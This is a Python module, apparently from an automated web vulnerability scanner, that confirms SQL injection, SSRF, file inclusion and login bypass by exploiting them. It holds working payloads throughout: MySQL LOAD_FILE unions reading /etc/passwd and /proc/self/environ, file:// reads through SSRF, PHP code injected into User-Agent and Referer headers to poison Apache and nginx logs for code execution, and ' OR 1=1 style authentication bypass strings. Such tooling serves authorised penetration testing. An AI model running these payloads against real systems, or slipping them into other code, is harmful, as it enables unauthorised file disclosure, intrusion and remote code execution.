import time
from typing import Dict

from tools.http_client import build_url
from tools.log_utils import get_logger

logger = get_logger("cross_validator")


def validate_sqli_with_lfi(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "sqli_lfi_cross", "confidence": 0.0, "evidence": []}
    lfi_paths = ["/etc/passwd", "/etc/issue", "/proc/self/environ"]
    for lfipath in lfi_paths:
        for prefix in ["' UNION SELECT LOAD_FILE('%s')--", "' UNION SELECT LOAD_FILE('%s'),2,3--",
                        "'||LOAD_FILE('%s')||'"]:
            payload = prefix % lfipath
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if r.status_code == 200:
                    if "root:" in r.text or "nobody:" in r.text:
                        result["vulnerable"] = True
                        result["confidence"] = 0.9
                        result["evidence"].append({"method": "mysql_load_file", "file": lfipath, "preview": r.text[:100].strip()})
                        result["dbms"] = "mysql"
                        return result
                    if "[fonts]" in r.text:
                        result["vulnerable"] = True
                        result["confidence"] = 0.85
                        result["evidence"].append({"method": "mysql_load_file_win", "file": lfipath, "preview": r.text[:100].strip()})
                        result["dbms"] = "mysql"
                        return result
            except Exception:
                continue
    return result


def validate_ssrf_with_lfi(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "ssrf_lfi_cross", "confidence": 0.0, "evidence": []}
    file_urls = [
        "file:///etc/passwd",
        "file:///etc/issue",
        "file:///proc/self/environ",
        "file://c:/windows/win.ini",
        "file:///var/www/html/index.php",
    ]
    for file_url in file_urls:
        try:
            r = sess.get(build_url(url, param, file_url), timeout=timeout)
            if r.status_code == 200 and len(r.text) > 30:
                if "root:" in r.text or "[fonts]" in r.text or "PATH=" in r.text:
                    result["vulnerable"] = True
                    result["confidence"] = 0.85
                    result["evidence"].append({"type": "file_read", "url": file_url, "preview": r.text[:150].strip()})
                    break
        except Exception:
            continue
    return result


def validate_lfi_with_log_poison(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "lfi_log_poison_cross", "confidence": 0.0, "evidence": []}
    marker = "CROSSVAL_%d" % int(time.time())
    try:
        sess.get(url, headers={"User-Agent": "<?php echo '%s';?>" % marker,
                                 "Referer": "<?php echo '%s';?>" % marker},
                 timeout=timeout)
    except Exception:
        pass
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/proc/self/environ",
    ]
    for log_path in log_paths:
        try:
            r = sess.get(build_url(url, param, log_path), timeout=timeout)
            if r.status_code == 200 and marker in r.text:
                result["vulnerable"] = True
                result["confidence"] = 0.95
                result["evidence"].append({"method": "log_poison", "log_path": log_path, "marker_found": marker})
                result["rce_available"] = True
                return result
        except Exception:
            continue
    return result


def validate_sqli_with_second_order(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "sqli_second_order", "confidence": 0.0, "evidence": []}
    marker = "SORD_%d" % int(time.time())

    inject_payloads = [
        "' UNION SELECT '%s','',''--" % marker,
        "' UNION SELECT 1,'%s',3--" % marker,
        "\" UNION SELECT '%s','',''--" % marker,
    ]
    for payload in inject_payloads:
        try:
            sess.get(build_url(url, param, payload), timeout=timeout)
        except Exception:
            continue

    confirm_urls = [
        url,
        url + "/" + marker,
        url.replace(param + "=", param + "=" + marker),
    ]
    for confirm_url in confirm_urls:
        try:
            r = sess.get(confirm_url, timeout=timeout)
            if marker in r.text:
                result["vulnerable"] = True
                result["confidence"] = 0.9
                result["evidence"].append({"method": "second_order_injection", "confirm_url": confirm_url, "marker": marker})
                return result
        except Exception:
            continue
    return result


def validate_auth_with_sqli(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "auth_sqli_cross", "confidence": 0.0, "evidence": []}
    bypass_payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1\" --",
        "admin' --",
        "admin' #",
        "' OR 1=1 LIMIT 1 --",
    ]
    for payload in bypass_payloads:
        try:
            r = sess.get(build_url(url, param, payload), timeout=timeout)
            if r.status_code == 200:
                no_login_keywords = ["login", "password", "sign in", "invalid", "incorrect"]
                has_login = any(kw in r.text.lower() for kw in no_login_keywords)
                if not has_login and len(r.text) > 100:
                    result["vulnerable"] = True
                    result["confidence"] = 0.75
                    result["evidence"].append({"payload": payload[:40], "status": r.status_code, "size": len(r.text)})
                    break
        except Exception:
            continue
    return result


def run_cross_validation(vtype: str, url: str, param: str, sess,
                          timeout: float = 10.0) -> Dict:
    results = {}
    if vtype == "sqli":
        lfi_r = validate_sqli_with_lfi(url, param, sess, timeout)
        if lfi_r["vulnerable"]:
            results["sqli_to_lfi"] = lfi_r
        so_r = validate_sqli_with_second_order(url, param, sess, timeout)
        if so_r["vulnerable"]:
            results["second_order"] = so_r
    elif vtype == "ssrf":
        lfi_r = validate_ssrf_with_lfi(url, param, sess, timeout)
        if lfi_r["vulnerable"]:
            results["ssrf_to_file_read"] = lfi_r
    elif vtype == "lfi":
        lp_r = validate_lfi_with_log_poison(url, param, sess, timeout)
        if lp_r["vulnerable"]:
            results["lfi_to_rce"] = lp_r
    elif vtype == "auth_bypass":
        sqli_r = validate_auth_with_sqli(url, param, sess, timeout)
        if sqli_r["vulnerable"]:
            results["auth_sqli_bypass"] = sqli_r

    if results:
        combined_confidence = max(r.get("confidence", 0) for r in results.values())
        return {"vulnerable": True, "confidence": combined_confidence,
                 "method": "cross_validation", "cross_checks": results}
    return {"vulnerable": False, "confidence": 0.0, "method": "cross_validation"}
